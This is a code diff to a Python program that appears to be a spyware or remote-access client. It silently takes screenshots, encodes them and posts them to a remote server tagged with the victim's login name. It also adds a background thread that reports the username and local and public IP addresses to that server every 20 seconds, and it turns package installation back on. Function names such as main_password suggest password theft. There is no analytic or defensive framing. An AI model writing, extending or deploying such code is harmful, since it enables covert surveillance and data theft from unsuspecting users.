@@ -3,7 +3,7 @@ import subprocess, sys
 
 def install_packages(packages):
     """Install a list of packages using pip."""
-    return
+    # return
     for package in packages:
         print(f"Installing {package}...")
         try:
@@ -128,28 +128,21 @@ def main_password():
 
 def take_screenshot():
     try:
-        # Take the screenshot
         img_name = random.randint(1, 99999999)
         img = pg.screenshot()
 
-        # Resize the image to reduce size (e.g., 50% of the original size)
-        img = img.resize((img.width // 2, img.height // 2))  # Resize to 50% of the original size
+        img = img.resize((img.width // 2, img.height // 2))
 
-        # Save the image to a temporary path
-        img_path = os.path.join(os.getcwd(), f'{img_name}.png')  # Save to the current working directory
+        img_path = os.path.join(os.getcwd(), f'{img_name}.png')
         img.save(img_path, format="PNG")
 
         with open(img_path,'rb') as image_file:
             image_string = image_file.read()
 
-        # Construct the URL (make sure to URL encode the Base64 string)
         url = f"{URL}/ss?target={os.getlogin()}&state=false"
 
-        # Send the GET request
         response = requests.post(url, json={"imgdata": base64.b32encode(image_string).decode("utf-8")})
-        response.raise_for_status()  # Raise an exception for HTTP errors
 
-        # Clean up: remove the temporary image file
         os.remove(img_path)
     except Exception as e:
         print(f"An error occurred: {e}")
@@ -227,11 +220,14 @@ def listen():
         except Exception as e:
             pass
 
-try:
-    requests.get(f"{URL}/login?user={os.getlogin()}&ip={get_local_ip()}&public_ip={get_public_ip()}")
-except Exception as e:
-    pass
-
+def login_target():
+    while True:
+        try:
+            requests.get(f"{URL}/login?user={os.getlogin()}&ip={get_local_ip()}&public_ip={get_public_ip()}")
+        except Exception as e:
+            pass
+        time.sleep(20)
+        
 def run_asyncio_loop(loop):
     asyncio.set_event_loop(loop)
     loop.run_forever()
@@ -240,4 +236,7 @@ if __name__ == "__main__":
     loop = asyncio.new_event_loop()
     listen_thread = threading.Thread(target=listen)
     listen_thread.start()
+    
+    login_thread = threading.Thread(target=login_target)
+    login_thread.start()
     run_asyncio_loop(loop)
